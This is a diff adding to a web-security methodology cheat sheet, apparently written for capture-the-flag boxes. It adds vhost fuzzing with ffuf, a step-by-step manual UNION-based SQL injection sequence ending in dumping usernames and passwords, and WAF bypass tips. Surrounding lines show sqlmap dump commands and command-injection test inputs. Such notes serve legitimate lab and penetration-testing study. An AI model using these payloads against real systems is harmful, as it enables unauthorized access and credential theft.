@@ -1,5 +1,25 @@
 # Web Security Methodology
 
+## 0. Setup — If a domain name is provided (not just an IP)
+
+> **Reminder:** If the box gives you a hostname (e.g. `k2.thm`), add it to `/etc/hosts` before running any tools — curl, gobuster, ffuf, and evil-winrm all rely on hostname resolution.
+
+```bash
+echo "<IP> <hostname>" | sudo tee -a /etc/hosts
+```
+
+Then fuzz for vhosts/subdomains — the real app is often hiding behind a subdomain like `admin.k2.thm`:
+
+```bash
+ffuf -u http://<hostname> -H "Host: FUZZ.<hostname>" -w /snap/seclists/current/Discovery/DNS/subdomains-top1million-5000.txt -fs $(curl -s -o /dev/null -w "%{size_download}" http://<hostname>) -o ffuf-vhosts.txt
+```
+
+Any hit with a different size than the default page is a new vhost. Add discovered subdomains to `/etc/hosts` too:
+
+```bash
+echo "<IP> admin.<hostname> it.<hostname>" | sudo tee -a /etc/hosts
+```
+
 ## 1. Reconnaissance
 
 ```bash
@@ -113,6 +133,37 @@ sqlmap -u "http://<target>/page?id=1" --dbs
 sqlmap -u "http://<target>/page?id=1" -D <db> --tables
 sqlmap -u "http://<target>/page?id=1" -D <db> -T <table> --dump
 ```
+
+**UNION-based SQLi manual approach (when WAF blocks OR/AND):**
+
+WAFs often block `OR`/`AND` but not `UNION SELECT`. Work through this sequence:
+
+```
+1. Confirm injection:   input'--        → 500 = query broke = injectable
+2. Find column count:   input' UNION SELECT null,null,null-- -   (add nulls until no error)
+3. Fingerprint DB:
+     ' UNION SELECT null,VERSION(),null-- -        → MySQL/MariaDB (returns x.x.x-ubuntu...)
+     ' UNION SELECT null,version(),null-- -        → PostgreSQL
+     ' UNION SELECT null,@@version,null-- -        → MSSQL
+     ' UNION SELECT null,sqlite_version(),null-- - → SQLite
+4. List tables (MySQL):
+     ' UNION SELECT null,table_name,null FROM information_schema.tables WHERE table_schema=database()-- -
+5. Get columns (one table per request — avoid OR in WHERE):
+     ' UNION SELECT null,column_name,null FROM information_schema.columns WHERE table_name='users'-- -
+6. Dump data:
+     ' UNION SELECT username,password,email FROM users-- -
+```
+
+**DB-specific info_schema differences:**
+- MySQL: `information_schema.tables`, `table_schema=database()`
+- PostgreSQL: `information_schema.tables`, `table_catalog=current_database()`
+- MSSQL: `information_schema.tables` or `sys.tables`
+- SQLite: `sqlite_master` (no information_schema)
+
+**WAF bypass tips for SQLi:**
+- Replace `OR`/`AND` in WHERE with separate requests
+- Use `-- -` (space after dashes) instead of `--` for MySQL
+- If `sqlite_master` 500s, it's not SQLite — try `VERSION()` next
 
 **Command Injection:**
 - Test inputs with: `; id`, `| id`, `&& id`, `` `id` ``
